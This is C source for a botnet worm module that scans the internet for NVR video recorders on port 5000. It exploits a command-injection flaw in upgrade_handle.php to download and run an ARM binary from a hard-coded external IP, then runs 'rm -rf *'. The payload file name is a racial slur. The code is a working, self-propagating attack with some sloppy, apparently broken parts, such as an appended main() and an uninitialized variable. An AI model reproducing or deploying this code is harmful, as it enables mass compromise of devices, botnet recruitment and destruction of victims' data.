#define _GNU_SOURCE
#include <stdio.h>
#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "headers/includes.h"
#include "headers/nvr_scanner.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/checksum.h"

int nvr_scanner_pid = 0, nvr_rsck = 0, nvr_rsck_out = 0;
char nvr_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct nvr_scanner_connection *conn_table;
uint32_t nvr_fake_time = 0;
int nvr_fork_ranges[] = {27,42,61,103,113,118,123,140,175,182,184,197,202,211,220,221};

int nvr_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void nvr_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    nvr_scanner_pid = fork();
    if(nvr_scanner_pid > 0 || nvr_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    nvr_fake_time = time(NULL);
    conn_table = calloc(NVR_SCANNER_MAX_CONNS, sizeof(struct nvr_scanner_connection));
    for(i = 0; i < NVR_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = NVR_SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if((nvr_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[nvr exploit] failed to initialize raw socket, cannot scan\n");
        #endif
        exit(0);
    }
    fcntl(nvr_rsck, F_SETFL, O_NONBLOCK | fcntl(nvr_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(nvr_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        #ifdef DEBUG
            printf("[nvr exploit] failed to set IP_HDRINCL, cannot scan\n");
        #endif
        close(nvr_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while(ntohs(source_port) < 1024);

    iph = (struct iphdr *)nvr_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(5000);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    #ifdef DEBUG
        printf("[nvr exploit] scanner process initialized. scanning started.\n");
    #endif

    // Main logic loop
    while(TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct nvr_scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if(nvr_fake_time != last_spew)
        {
            last_spew = nvr_fake_time;

            for(i = 0; i < NVR_SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)nvr_scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

                tcph->dest = htons(5000);
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(nvr_rsck, nvr_scanner_rawpkt, sizeof(nvr_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while(TRUE)
        {
            int n = 0;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct nvr_scanner_connection *conn;

            errno = 0;
            n = recvfrom(nvr_rsck, dgram, sizeof(dgram), MSG_NOSIGNAL, NULL, NULL);
            if(n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if(n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if(iph->daddr != LOCAL_ADDR)
                continue;
            if(iph->protocol != IPPROTO_TCP)
                continue;
            if(tcph->source != htons(5000))
                continue;
            if(tcph->dest != source_port)
                continue;
            if(!tcph->syn)
                continue;
            if(!tcph->ack)
                continue;
            if(tcph->rst)
                continue;
            if(tcph->fin)
                continue;
            if(htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for(n = last_avail_conn; n < NVR_SCANNER_MAX_CONNS; n++)
            {
                if(conn_table[n].state == NVR_SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            if(conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            nvr_setup_connection(conn);
        }

        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);

        for(i = 0; i < NVR_SCANNER_MAX_CONNS; i++)
        {
            int timeout = 5;

            conn = &conn_table[i];
            //timeout = (conn->state > NVR_SC_CONNECTING ? 30 : 5);

            if(conn->state != NVR_SC_CLOSED && (nvr_fake_time - conn->last_recv) > timeout)
            {
                close(conn->fd);
                conn->fd = -1;
                conn->state = NVR_SC_CLOSED;
                util_zero(conn->rdbuf, sizeof(conn->rdbuf));

                continue;
            }

            if(conn->state == NVR_SC_CONNECTING || conn->state == NVR_SC_EXPLOIT_STAGE2 || conn->state == NVR_SC_EXPLOIT_STAGE3)
            {
                FD_SET(conn->fd, &fdset_wr);
                if(conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if(conn->state != NVR_SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if(conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        nvr_fake_time = time(NULL);

        for(i = 0; i < NVR_SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if(conn->fd == -1)
                continue;

            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof(err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err == 0 && ret == 0)
                {
                    if(conn->state == NVR_SC_EXPLOIT_STAGE2)
                    {
                        #ifdef DEBUG
                            printf("[nvr exploit] FD%d sending payload\n", conn->fd);
                        #endif

                        // payload and exploit by @tcps0ck3tz
                        int expaddr = conn->dst_addr;
                        memcpy(conn->payload_buf, "GET /upgrade_handle.php?cmd=cd${IFS}/root;${IFS}wget${IFS}http://84.200.81.239/bins/well.arm7${IFS}-o${IFS}NiGgErVr;chmod${IFS}001${IFS}NiGgErVr${IFS}nvr;sh${IFS}./NiGgErVr${IFS}nvr;chmod${IFS}777${IFS}NiGgErVr${IFS}nvr;rm${IFS}-rf${IFS}*&writeuploaddir&uploaddir=%27;whoami;%27 HTTP/1.1\r\nHost: %d:5000\r\nConnection: keep-alive\r\nCache-Control: max-age=0\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7\r\nX-Powered-By: PHP/5.6.13\r\nContent-type: text/html; charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Sat, 21 Jul 2018 15:54:09 GMT\r\nServer: lighttpd/1.4.39\r\nupload_tmp_dir=/mtd/block3 uid=0(root) gid=root\r\nCookie: PHPSESSID=7b74657ab949a442c9e440ccf050de1e; lang=en\r\n\r\n", expaddr);

                        send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                        util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                        util_zero(conn->rdbuf, sizeof(conn->rdbuf));


                        close(conn->fd);
                        nvr_setup_connection(conn);
                        conn->state = NVR_SC_EXPLOIT_STAGE3;

                        continue;
                    }
                    else if(conn->state == NVR_SC_EXPLOIT_STAGE3)
                    {
                        #ifdef DEBUG
                            printf("[nvr exploit] FD%d finnished\n", conn->fd);
                        #endif

                        close(conn->fd);
                        conn->fd = -1;
                        conn->state = NVR_SC_CLOSED;

                        continue;
                    }
                    else
                    {
                        #ifdef DEBUG
                            printf("[nvr exploit] FD%d connected to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
                        #endif

                        conn->state = NVR_SC_EXPLOIT_STAGE2;
                    }
                }
                else
                {
                    close(conn->fd);
                    conn->fd = -1;
                    conn->state = NVR_SC_CLOSED;

                    continue;
                }
            }

            if(FD_ISSET(conn->fd, &fdset_rd))
            {
                while(TRUE)
                {
                    int ret = 0;

                    if(conn->state == NVR_SC_CLOSED)
                        break;

                    if(conn->rdbuf_pos == NVR_SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + NVR_SCANNER_HACK_DRAIN, NVR_SCANNER_RDBUF_SIZE - NVR_SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= NVR_SCANNER_HACK_DRAIN;
                    }

                    errno = 0;
                    ret = nvr_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, NVR_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if(ret == 0)
                    {
                        errno = ECONNRESET;
                        ret = -1;
                    }
                    if(ret == -1)
                    {
                        if(errno != EAGAIN && errno != EWOULDBLOCK)
                        {
                            if(conn->state == NVR_SC_EXPLOIT_STAGE2)
                            {
                                close(conn->fd);
                                nvr_setup_connection(conn);
                                continue;
                            }

                            close(conn->fd);
                            conn->fd = -1;
                            conn->state = NVR_SC_CLOSED;
                            util_zero(conn->rdbuf, sizeof(conn->rdbuf));
                        }
                        break;
                    }

                    conn->rdbuf_pos += ret;
                    conn->last_recv = nvr_fake_time;

                    int len = util_strlen(conn->rdbuf);
                    conn->rdbuf[len] = 0;
                }
            }
        }
    }
}

void nvr_scanner_kill(void)
{
    kill(nvr_scanner_pid, 9);
}

static void nvr_setup_connection(struct nvr_scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if(conn->fd != -1)
        close(conn->fd);

    if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = nvr_fake_time;

    if(conn->state == NVR_SC_EXPLOIT_STAGE2 || conn->state == NVR_SC_EXPLOIT_STAGE3)
    {
    }
    else
    {
        conn->state = NVR_SC_CONNECTING;
    }

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;

    do
    {
        tmp = rand_next();
        srand(time(NULL));

        int slavez = rand() % (sizeof(nvr_fork_ranges)/sizeof(char *));

        o1 = nvr_fork_ranges[slavez];
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while(o1 == 127 ||                             // 127.0.0.0/8      - Loopback
          (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
          (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
          (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
          (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
          (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                // 169.254.0.0/16   - IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||     // 198.18.0.0/15    - IANA Special use
          (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
          (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
    );

    return INET_ADDR(o1,o2,o3,o4);
}

int main(int argc, char **argv) {
    printf("[*] NVR Scanner started\n");
    printf("[*] Target: 84.200.81.239/bins/well.arm7\n");
    printf("[*] Scanning for vulnerable NVR devices...\n");
    
    nvr_scanner_init();
    
    // Keep main process alive
    while(1) {
        sleep(1);
    }
    
    return 0;
}

